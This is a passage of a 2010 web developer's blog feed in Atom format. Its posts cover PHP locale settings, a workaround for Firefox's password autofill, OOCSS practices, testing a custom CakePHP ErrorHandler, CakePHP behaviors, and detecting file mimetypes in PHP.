core (&lt;code&gt;Inflector&lt;/code&gt;). Defining a &lt;code&gt;CTYPE&lt;/code&gt;locale for your whole app may be a
better solution.&lt;/p&gt;

&lt;p&gt;Just add a &lt;code&gt;setlocale(LC_CTYPE, &amp;#39;C&amp;#39;);&lt;/code&gt; in your app and all your utf8 strings
will correctly work with string functions.&lt;/p&gt;

&lt;p&gt;Just note that on Windows, calling setlocale will change the locale for all
threads, not just the one where PHP is running. This may cause unexpected
results.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>How to fix the Firefox autocomplete 'feature'</title>
   <link href="http://blog.pixelastic.com/2010/08/12/how-to-fix-the-firefox-autocomplete-feature/"/>
   <updated>2010-08-12T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/08/12/how-to-fix-the-firefox-autocomplete-feature</id>
   <content type="html">&lt;p&gt;Firefox can be quite a pain sometimes. I usually praise this browser features
but today I had to deal with one tricky &amp;#39;intelligent&amp;#39; feature.&lt;/p&gt;

&lt;p&gt;You know that autocomplete/autofill feature, so that when you enter your user
name, Firefox automatically fill the corresponding password field so you won&amp;#39;t
have to do it ?&lt;/p&gt;

&lt;p&gt;Well, it is bad, and here&amp;#39;s why.&lt;/p&gt;

&lt;h2&gt;How does it work ?&lt;/h2&gt;

&lt;p&gt;I haven&amp;#39;t read the source code, but from what I&amp;#39;ve experienced it seems to
work like that :&lt;/p&gt;

&lt;p&gt;For each password field, FF will find the related username text field. This is
just a very basic search, it assume that the closest previous text field is
the related one. Now, everytime you enter a value in the text field that match
one of the username saved, it will autofill the password field.&lt;/p&gt;

&lt;p&gt;Note that if you have more than 5 password fields on a page, the feature will
be disabled.&lt;/p&gt;

&lt;h2&gt;What is terribly wrong with this approach&lt;/h2&gt;

&lt;p&gt;Let&amp;#39;s imagine you are a registered user of a website. You want to update your
preferences. You have a nice page with lots of input fields where you can
change your email, password and date of birth.&lt;/p&gt;

&lt;p&gt;For security reasons, your password is not displayed. For convenient reasons,
the website also don&amp;#39;t ask you to type your password everytime your want to
update your settings. It assumes that if you let the password field blank, it
means that you don&amp;#39;t want to change it. And if you really want to change it,
then it asks for a confirmation, to make sure your correctly typed it.&lt;/p&gt;

&lt;p&gt;So, with this autocomplete feature, if your email is also your login for the
website (as it is often the case), Firefox will autofill the password field
with your password. Meaning that if you submit your form, you&amp;#39;ll be met with
an error because your password and it&amp;#39;s confirmation does not match.&lt;/p&gt;

&lt;p&gt;You&amp;#39;ll then have to manually clear the content of the password field everytime
your want to edit your profile. Which is counter-intuitive. The whole
convenient method of not changing the password if left empty is rendered
useless.&lt;/p&gt;

&lt;p&gt;The worst part is that most users won&amp;#39;t understand when the error comes and
will blame the webdeveloper.&lt;/p&gt;

&lt;h2&gt;Solutions that does not work&lt;/h2&gt;

&lt;p&gt;First, Firefox is just doing a very wild guess on that fields. And, there is
no way to disable this feature from the page markup. Sure, as a user you can
disable it in your browser setting, but as a web developper, you can&amp;#39;t disable
it.&lt;/p&gt;

&lt;p&gt;There is a non-standard &lt;code&gt;autocomplete=&amp;quot;off&amp;quot;&lt;/code&gt; argument, but it does not work in
our case. It is supposed to prevent the browser to store previously entered
values on sensible fields (like credit card numbers).&lt;/p&gt;

&lt;p&gt;I&amp;#39;ve tried putting this &lt;code&gt;autocomplete&lt;/code&gt;attribute on every input field, even on
the form itself. Setting the &lt;code&gt;value&lt;/code&gt;attribute does not work either. Even
updating the value through Javascript would not work because the password
field will get re-populated on every blur event on the text field.&lt;/p&gt;

&lt;h2&gt;A solution that does work&lt;/h2&gt;

&lt;p&gt;The final solution I&amp;#39;ve found is to add a dummy password field between your
real mail and password fields. That way, Firefox will autocomplete this dummy
password instead of the real one.&lt;/p&gt;

&lt;p&gt;Unfortunatly this adds clutter to your markup, but with a little
&lt;code&gt;display:none&lt;/code&gt; in CSS it won&amp;#39;t ever be seen by your users.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>7 advices to start using OOCSS as a coding practice</title>
   <link href="http://blog.pixelastic.com/2010/08/11/7-advices-to-start-using-oocss-as-a-coding-practice/"/>
   <updated>2010-08-11T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/08/11/7-advices-to-start-using-oocss-as-a-coding-practice</id>
   <content type="html">&lt;p&gt;Not long ago, I stumbled across this &lt;a href=&quot;http://www.stubbornella.org/content/2010/07/01/top-5-mistakes-of-%0Amassive-css/&quot;&gt;video about massive and unmaintainable
CSS files&lt;/a&gt; from Nicole Sullivan. It made me want to try OOCSS.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://wiki.github.com/stubbornella/oocss/&quot;&gt;OOCSS &lt;/a&gt;is a way to code css in a
way that replicates the goodies general OOP told us. Classic CSS use the
cascade in selectors to emulate a concept of inheritence.&lt;/p&gt;

&lt;p&gt;OOCSS puts the concept of inheritence a little step further by telling us to
create &amp;quot;modules&amp;quot; in our CSS files. Each module represent a &amp;quot;widget&amp;quot; of our
page, or should I say of our whole site.&lt;/p&gt;

&lt;p&gt;It comes with a simple list of principles that could allow one to write much
more flexible and maintainable code. I rewrote the whole CSS for this website
(as well as the admin interface I&amp;#39;m using behind the doors) following those
principles, and I thought I&amp;#39;ll share it with you.&lt;/p&gt;

&lt;h2&gt;Drop the &lt;code&gt;#id&lt;/code&gt; selector&lt;/h2&gt;

&lt;p&gt;We won&amp;#39;t be using the &lt;code&gt;#id&lt;/code&gt; selector anymore (except for some edge cases).
Instead of &lt;code&gt;#commentList {}&lt;/code&gt; we&amp;#39;ll use &lt;code&gt;.commentList {}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;This change alone lets us reuse the same element multiple times on the same
page.&lt;/p&gt;

&lt;p&gt;Note that we will still add &lt;code&gt;ids&lt;/code&gt; in our HTML markup for form inputs or for
Javascript purpose (&lt;code&gt;document.getElementById&lt;/code&gt; is still the faster selection
method).&lt;/p&gt;

&lt;h2&gt;Don&amp;#39;t make your selector dependent on the page structure&lt;/h2&gt;

&lt;p&gt;We won&amp;#39;t style our elements based on where they will be displayed in the page.&lt;/p&gt;

&lt;p&gt;We don&amp;#39;t care if our module will be displayed in a footer, sidebar, specific
page or whatever. We just style it all the same.&lt;/p&gt;

&lt;p&gt;Instead of writing &lt;code&gt;.sidebar .lastComments {}&lt;/code&gt;, we will go for the shorter
&lt;code&gt;.lastComments {}&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This will allow us to easily display the last comments on any page, anywhere.
You should carefully name your modules to something that clearly evoke what
the module is supposed to display, without ambiguity.&lt;/p&gt;

&lt;p&gt;If you need to tweak the display of an element in a certain part of the page,
you could always write a specific selector for this specific need, that will
overwrite the default rules. But this must not be your default selector.&lt;/p&gt;

&lt;h2&gt;Do not use both tag and class selector on the same element&lt;/h2&gt;

&lt;p&gt;Avoid the &lt;code&gt;div.errorMessage&lt;/code&gt;, &lt;code&gt;ul.userList&lt;/code&gt; selectors. The first one is just
too specific : what happen if you ever want to style a &lt;code&gt;&amp;lt;p&amp;gt;&lt;/code&gt; instead of a
&lt;code&gt;&amp;lt;div&amp;gt;&lt;/code&gt; ? The second one is useless, &lt;code&gt;&amp;lt;ul&amp;gt;&lt;/code&gt; is a list by definition.&lt;/p&gt;

&lt;p&gt;There is only one moment when being that specific can be useful, it is when
you need to overwrite, for a specific element, rules defined for the class.
Fortunatly, thanks to the OOCSS coding style, this won&amp;#39;t happen much.&lt;/p&gt;

&lt;h2&gt;Don&amp;#39;t make your selectors over-specific&lt;/h2&gt;

&lt;p&gt;This is a followup of the previous rule, but don&amp;#39;t write overly specific
rules, like .&lt;code&gt;userList table thead tr th a&lt;/code&gt;. A simple &lt;code&gt;.userList thead a&lt;/code&gt; is
enough.&lt;/p&gt;

&lt;p&gt;First, you are overly detailing each level of the markup while most of the
time the uppermost and lowermost parts are enough. But you also define useless
selectors like &lt;code&gt;tr th&lt;/code&gt; or &lt;code&gt;ul li,&lt;/code&gt; where &lt;code&gt;th&lt;/code&gt; or &lt;code&gt;li&lt;/code&gt; are enough (those
elements can not be placed in any other parent element).&lt;/p&gt;

&lt;h2&gt;Create your own reset stylesheet&lt;/h2&gt;

&lt;p&gt;To avoid repeating &lt;code&gt;margin:0; padding:0&lt;/code&gt; over and over in your stylesheets,
you should spend some time finding a reset stylesheet that you like and then
tweaking it to fit your coding practice.&lt;/p&gt;

&lt;p&gt;I used to include the &lt;a href=&quot;http://devkick.com/lab/tripoli/&quot;&gt;Tripoli framework&lt;/a&gt; in
my previous projects but I found that I had to reset styles it was settings
far too often.&lt;/p&gt;

&lt;p&gt;All reset stylesheets are not equals, some will just remove all styling from
elements, letting you define them as you want. Others will also assign default
rendering styles to make something both visually beautiful and cross-browser.&lt;/p&gt;

&lt;p&gt;But the best reset stylesheet you&amp;#39;ll get is the one you&amp;#39;ll create (or, as it
is quite a bit of work, tweak) yourself.&lt;/p&gt;

&lt;h2&gt;Use a grid system to place elements&lt;/h2&gt;

&lt;p&gt;Some years ago, I found CSS Framework like Blueprint to be a waste of time. I
didn&amp;#39;t want to clutter mu HTML markup with &lt;em&gt;non-semantic&lt;/em&gt; classes for handling
the styling.&lt;/p&gt;

&lt;p&gt;I also found that the psd files I was given to integrate couldn&amp;#39;t fit in grids
because the sidebar was 173px wide for example.&lt;/p&gt;

&lt;p&gt;Now I still don&amp;#39;t think cluttering the HTML with &lt;code&gt;span-6 pull-2&lt;/code&gt; is the best
thing that happened to CSS, but I found it much better than cluttering my CSS
with endless &lt;code&gt;overflow:hidden&lt;/code&gt; and &lt;code&gt;float:left; margin-right:10px&lt;/code&gt;
declarations.&lt;/p&gt;

&lt;p&gt;And I still got design from not-so-professional designers to integrate that do
not seems to have any logical proportion, and can&amp;#39;t fit them in grids. But I
also work with more talented people that deliver beautiful design and they
tend to be the one that fits easily into grids.&lt;/p&gt;

&lt;p&gt;So it may not always be possible to use a grid system, but more often than
not, it is and even if that means tweaking the original (badly designed)
design a dozen pixels off, it will greatly help the CSS process.&lt;/p&gt;

&lt;h2&gt;Create a global stylesheet for your main classes&lt;/h2&gt;

&lt;p&gt;I also create a main stylesheet for all the classes I know I&amp;#39;ll be reusing all
accross this project (and others). I include it at the top, right after the
reset one.&lt;/p&gt;

&lt;p&gt;In it I&amp;#39;ll defined general classes that could be extended by all the other
inner classes later. Like a &lt;code&gt;.message&lt;/code&gt; class, that I may be extending later
using &lt;code&gt;.message.error&lt;/code&gt; or .&lt;code&gt;message.success&lt;/code&gt;&lt;/p&gt;

&lt;h2&gt;One final word&lt;/h2&gt;

&lt;p&gt;Ok, this is it. I&amp;#39;m fairly new to OOCSS too, so I&amp;#39;m still discovering it too.
So far I found that I have greatly reduce the size of my files but most
importantly, my styles are way more easy to tweak for special needs than
before.&lt;/p&gt;

&lt;p&gt;It also helped me separate the various elements of the website, and it is much
more easier to find the piece I need. Fewer classes to depends on means I know
where the rules are coming from and I can write more specific selectors if
need me more easily.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Testing a custom ErrorHandler in cakePHP</title>
   <link href="http://blog.pixelastic.com/2010/08/08/testing-a-custom-errorhandler-in-cakephp/"/>
   <updated>2010-08-08T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/08/08/testing-a-custom-errorhandler-in-cakephp</id>
   <content type="html">&lt;p&gt;I just finished writing the test case for a custom &lt;code&gt;AppError&lt;/code&gt;class. Writing
the tests case was indeed much more difficult than writing the class itself.&lt;/p&gt;

&lt;p&gt;Here are some things I&amp;#39;ve found that may interest anyone wanting to test their
own &lt;code&gt;ErrorHandlers&lt;/code&gt;. Most of the ideas are taken from the core
&lt;code&gt;ErrorHandlerTest&lt;/code&gt;.&lt;/p&gt;

&lt;h2&gt;Anatomy of an error&lt;/h2&gt;

&lt;p&gt;Every class in cakePHP extends &lt;code&gt;Object&lt;/code&gt;. And in &lt;code&gt;Object&lt;/code&gt;is defined a method
named &lt;code&gt;cakeError&lt;/code&gt;. It means that anywhere in your app you can call
&lt;code&gt;$this-&amp;gt;cakeError(&lt;/code&gt;) and the whole app will stop and display the specified
error.&lt;/p&gt;

&lt;p&gt;What &lt;code&gt;cakeError&lt;/code&gt;does is instantly create an instance of either &lt;code&gt;Controller
&lt;/code&gt;or &lt;code&gt;CakeErrorController&lt;/code&gt;, find the correct view, render it, and stop.&lt;/p&gt;

&lt;p&gt;Because of the use of static variables, &lt;code&gt;exit&lt;/code&gt;calls and other happyness,
testing several errors in a test case needs us to define some new classes to
shortcircuit most of the logic.&lt;/p&gt;

&lt;h2&gt;Preparing the test&lt;/h2&gt;

&lt;p&gt;This step is actually pretty short. Just load the default &lt;code&gt;ErrorHandler&lt;/code&gt;by
calling &lt;code&gt;App::import(&amp;#39;Core&amp;#39;,&amp;#39;Error&amp;#39;);&lt;/code&gt;&lt;/p&gt;

&lt;h2&gt;Creating a dummy AppController&lt;/h2&gt;

&lt;p&gt;Then, you&amp;#39;ll have to create a new &lt;code&gt;AppController&lt;/code&gt;class that extends
&lt;code&gt;Controller&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;We will override the &lt;code&gt;header&lt;/code&gt;method to prevent &amp;#39;&lt;em&gt;Headers already set&lt;/em&gt;&amp;#39; error
when calling several errors in a row.&lt;/p&gt;

&lt;p&gt;We will also override the &lt;code&gt;render&lt;/code&gt; method to store in an inner property the
name of the rendered action. It will help test that the correct error is
rendered.&lt;/p&gt;

&lt;p&gt;You may also need to define a custom list of helpers if your custom views are
using any custom helpers.&lt;/p&gt;

&lt;p&gt;Here is what it looks like on my side :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;class AppController extends Controller {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // Helpers used in the view. If not set, will generate a fatal error&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  var $helpers = array(&amp;#39;Caracole.Fastcode&amp;#39;, &amp;#39;CaracolePacker.Packer&amp;#39;);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // Overriding the header method. If not set, will generate &amp;#39;Headers already set&amp;#39; errors;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  function header($header) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    $this-&amp;gt;header = $header;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // Overriding render method to keep track of the rendered error&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  function render($action) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;Â Â Â  Â Â Â    $this-&amp;gt;renderedAction = $action;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;Â Â Â  Â Â Â    return parent::render($action);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Creating a TestErrorHandler&lt;/h2&gt;

&lt;p&gt;This class will extends your &lt;code&gt;AppError&lt;/code&gt;. It will just overwrite two methods to
make it correctly work in a test case.&lt;/p&gt;

&lt;p&gt;First, we&amp;#39;ll need to overwrite the &lt;code&gt;__construct&lt;/code&gt;. The default construct will
set the inner &lt;code&gt;$this-&amp;gt;controller&lt;/code&gt; property to either a &lt;code&gt;Controller&lt;/code&gt;or a
&lt;code&gt;CakeErrorController&lt;/code&gt;instance depending if its the first error fired or not.
I must admit that I haven&amp;#39;t really understand the difference between the two.
But I know that &lt;code&gt;CakeErrorController&lt;/code&gt;extends &lt;code&gt;AppController&lt;/code&gt;while
&lt;code&gt;Controller&lt;/code&gt;extends &lt;code&gt;Object&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;And as we need to overwrite methods of this property, it being a
&lt;code&gt;CakeErrorController&lt;/code&gt;is great, while it being a &lt;code&gt;Controller&lt;/code&gt;is bad. Anyway,
what I did was copy/paste the parent &lt;code&gt;__construct&lt;/code&gt; into &lt;code&gt;TestErrorHandler&lt;/code&gt;and
just force it to always create a &lt;code&gt;CakeErrorController&lt;/code&gt;instance.&lt;/p&gt;

&lt;p&gt;The other method we need to overwrite is the &lt;code&gt;_stop&lt;/code&gt;. If we don&amp;#39;t, the whole
script will halt after the first error you&amp;#39;ll test.&lt;/p&gt;

&lt;p&gt;So, enough talk, here&amp;#39;s the code :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;class TestErrorHandler extends AppError {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // Copy/paste of ErrorHandler construct method, but force a new instance of CakeErrorController as $this-&amp;gt;controller each time&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // CakeErrorController extends AppController, so we can overwrite its methods&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  function __construct($method, $messages) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    App::import(&amp;#39;Core&amp;#39;, &amp;#39;Sanitize&amp;#39;);&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;    // Forcing CakeErrorController&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    $this-&amp;gt;controller =&amp;amp; new CakeErrorController();&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    $options = array(&amp;#39;escape&amp;#39; =&amp;gt; false);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    $messages = Sanitize::clean($messages, $options);&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;    if (!isset($messages[0])) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;      $messages = array($messages);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    }&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;    if (method_exists($this-&amp;gt;controller, &amp;#39;apperror&amp;#39;)) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;      return $this-&amp;gt;controller-&amp;gt;appError($method, $messages);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    }&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;    if (!in_array(strtolower($method), array_map(&amp;#39;strtolower&amp;#39;, get_class_methods($this)))) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;      $method = &amp;#39;error&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    if ($method !== &amp;#39;error&amp;#39;) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;      if (Configure::read(&amp;#39;debug&amp;#39;) == 0) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        $parentClass = get_parent_class($this);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        if (strtolower($parentClass) != &amp;#39;errorhandler&amp;#39;) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;          $method = &amp;#39;error404&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        $parentMethods = array_map(&amp;#39;strtolower&amp;#39;, get_class_methods($parentClass));&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        if (in_array(strtolower($method), $parentMethods)) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;          $method = &amp;#39;error404&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        if (isset($code) &amp;amp;&amp;amp; $code == 500) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;          $method = &amp;#39;error500&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;      }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    $this-&amp;gt;dispatchMethod($method, $messages);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    $this-&amp;gt;_stop();&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  }&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;  // Preventing the error from stopping all the request&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  function _stop() {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    return;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Writing your tests&lt;/h2&gt;

&lt;p&gt;Ok, your almost done. You just have now to write your tests. They have to
follow a special syntax to correctly work.&lt;/p&gt;

&lt;p&gt;First, you&amp;#39;ll have to wrap your &lt;code&gt;ErrorHandler&lt;/code&gt;creation between &lt;code&gt;ob_start()&lt;/code&gt;
and &lt;code&gt;$output= ob_get_content()&lt;/code&gt;, otherwise you&amp;#39;ll end up with error popping
right into your test case because the &lt;code&gt;ErrorHandler&lt;/code&gt;force the controller to
render the view.&lt;/p&gt;

&lt;p&gt;You&amp;#39;ll be able to access interesting properties through
&lt;code&gt;$errorHandler-&amp;gt;controller-&amp;gt;renderedAction&lt;/code&gt; and
&lt;code&gt;$errorHandler-&amp;gt;controller-&amp;gt;header&lt;/code&gt;. You can also directly test the view
output through &lt;code&gt;$output&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Ok, so here&amp;#39;s one of my tests :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;// DEV : Error will use the error layout&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;function testCallingErrorInDevWillUseErrorLayout() {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  ob_start();&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $errorHandler = new TestErrorHandler(&amp;#39;missingController&amp;#39;, $this-&amp;gt;errorParams);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $result = ob_get_clean();&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $this-&amp;gt;assertEqual($errorHandler-&amp;gt;controller-&amp;gt;layout, &amp;#39;error&amp;#39;);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;It took me some hours to glue all this pieces together, I hope it may be
useful to others, too. Writing the &lt;code&gt;AppError&lt;/code&gt;itself was way easier, but as
I&amp;#39;m now test infected I don&amp;#39;t imagine writing code without the corresponding
tests.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Correctly instanciating models in components</title>
   <link href="http://blog.pixelastic.com/2010/08/06/instanciating-models-in-components/"/>
   <updated>2010-08-06T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/08/06/instanciating-models-in-components</id>
   <content type="html">&lt;p&gt;I sometime need access to a specific model in a component. Say a &lt;code&gt;User&lt;/code&gt;model
for checking user rights in an &lt;code&gt;Auth&lt;/code&gt;component. In that cases, I just create
an instance of the model by calling a &lt;code&gt;$myModel =
&amp;amp;ClassRegistry::init($myModelName)&lt;/code&gt;. It works perfectly.&lt;/p&gt;

&lt;p&gt;Today I found that it wasn&amp;#39;t working exactly as I wanted. In fact, behaviors
used by models loaded that way are not completely set up. All their callback
methods (&lt;code&gt;beforeFind&lt;/code&gt;, &lt;code&gt;afterFind&lt;/code&gt;, &lt;code&gt;beforeSave&lt;/code&gt;, &lt;code&gt;afterSave&lt;/code&gt;) works as
expected, but the main &lt;code&gt;setup&lt;/code&gt; method is never called.&lt;/p&gt;

&lt;p&gt;This caused some havoc in my app because some *&lt;em&gt;reaaaaally *&lt;/em&gt;important stuff
was defined in the &lt;code&gt;setup&lt;/code&gt; method&lt;/p&gt;

&lt;h2&gt;There I fixed it&lt;/h2&gt;

&lt;p&gt;I just manually fired all the &lt;code&gt;setup&lt;/code&gt; methods by calling a simple :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;foreach($myModel-&amp;gt;Behaviors-&amp;gt;_attached as $behaviorName) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $myModel-&amp;gt;Behaviors-&amp;gt;{$behaviorName}-&amp;gt;setup($myModel);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Once again, small fix, but does the trick. I did not file a bug report because
I&amp;#39;m not really sure this is bug or if that is so by design.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Disabling a Behavior from inside its setup() method</title>
   <link href="http://blog.pixelastic.com/2010/08/06/disabling-a-behavior-from-inside-its-setup-method/"/>
   <updated>2010-08-06T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/08/06/disabling-a-behavior-from-inside-its-setup-method</id>
   <content type="html">&lt;p&gt;Sometime you write a nice Behavior, that will automate a lot of stuff that
almost all your models will need. But, unfortunatly, a couple of models won&amp;#39;t
need it. Actually, attaching it to them will even break your code.&lt;/p&gt;

&lt;p&gt;So what do you do ? Do you resort to manually fill the &lt;code&gt;$actsAs&lt;/code&gt; variable of
each model, except for the two lonely loosers, or defining the &lt;code&gt;$actsAs&lt;/code&gt; of
your main &lt;code&gt;AppModel&lt;/code&gt;really seems more appaling ?&lt;/p&gt;

&lt;h2&gt;Lazyness to the rescue&lt;/h2&gt;

&lt;p&gt;If, like me, you prefer writing less code, you&amp;#39;d probably go with the
&lt;code&gt;AppModel&lt;/code&gt; approach. All you have to do is define a &lt;code&gt;setup()&lt;/code&gt; method in your
Behavior and check if it is applied to the right or wrong type of model.
Fortunatly for us, the &lt;code&gt;$model&lt;/code&gt; is passed as first argument.&lt;/p&gt;

&lt;p&gt;Once you&amp;#39;ve identified the faulty models, you just have to disable the
behavior for them. The &lt;code&gt;BehaviorCollection&lt;/code&gt;that comes bundle into
&lt;code&gt;$model-&amp;gt;Behaviors&lt;/code&gt; has a nice couple of &lt;code&gt;enable&lt;/code&gt;/&lt;code&gt;disable&lt;/code&gt; methods.
Unfortunatly, they won&amp;#39;t work from inside the &lt;code&gt;setup()&lt;/code&gt; method because the
Behavior is not yet correctly instanciated.&lt;/p&gt;

&lt;p&gt;What you can do, however, is to hack inside the &lt;code&gt;BehaviorCollection&lt;/code&gt; to update
the inner &lt;code&gt;_disabled&lt;/code&gt; key to add your own Behavior to the list.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;function setup(&amp;amp;$model, $config = array()) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;Â  [...]&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  if ($faultyModel) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; Â Â  $model-&amp;gt;Behaviors-&amp;gt;_disabled[] = &amp;#39;MyBehavior&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This is more than a bit hacky, I have to admit that. But it does the trick.
Enjoy.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>The all-in-one method to get mimetypes with PHP</title>
   <link href="http://blog.pixelastic.com/2010/08/05/the-all-in-one-method-to-get-mimetypes-with-php/"/>
   <updated>2010-08-05T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/08/05/the-all-in-one-method-to-get-mimetypes-with-php</id>
   <content type="html">&lt;p&gt;Getting the correct mimetype from a file in PHP is not an easy task. I used to
find it through extension sniffing of the file combined with a known list of
mimetypes.&lt;/p&gt;

&lt;p&gt;Today I needed to find the correct mimetype to do some security checks on file
uploaded by users. I couldn&amp;#39;t rely on an extension-based approach because the
filename could easily be faked by an uploader.&lt;/p&gt;

&lt;p&gt;So I needed an other way. In fact, in PHP world there are at least 4 methods
I&amp;#39;m aware of to get this information.&lt;/p&gt;

&lt;h2&gt;mime&lt;em&gt;content&lt;/em&gt;type&lt;/h2&gt;

&lt;p&gt;The classic PHP function
&lt;a href=&quot;http://fr2.php.net/manual/en/function.mime-content-%0Atype.php&quot;&gt;mime&lt;em&gt;content&lt;/em&gt;type&lt;/a&gt; is supposed to return just that. Unfortunatly, it is deprecated. And
not supported by Dreamhost, my host.&lt;/p&gt;

&lt;h2&gt;The FileInfo functions&lt;/h2&gt;

&lt;p&gt;We are now encouraged to use the &lt;a href=&quot;http://php.net/manual/en/ref.fileinfo.php&quot;&gt;Fileinfo
functions&lt;/a&gt; instead of
&lt;code&gt;mime_content_type&lt;/code&gt;. Unfortunatly, they seems to be returning &lt;a href=&quot;http://www.php.net/manual/en/ref.fileinfo.php#79063&quot;&gt;strange
results&lt;/a&gt;. Alternatively,
they are not supported by Dreamhost either (but it seems that you can ask them
to install it on your server).&lt;/p&gt;

&lt;p&gt;It is bundled into EasyPHP for Windows, but you need to enable it by
uncommenting the line &lt;code&gt;extension=php_fileinfo.dll&lt;/code&gt; in your &lt;code&gt;php.ini&lt;/code&gt;&lt;/p&gt;

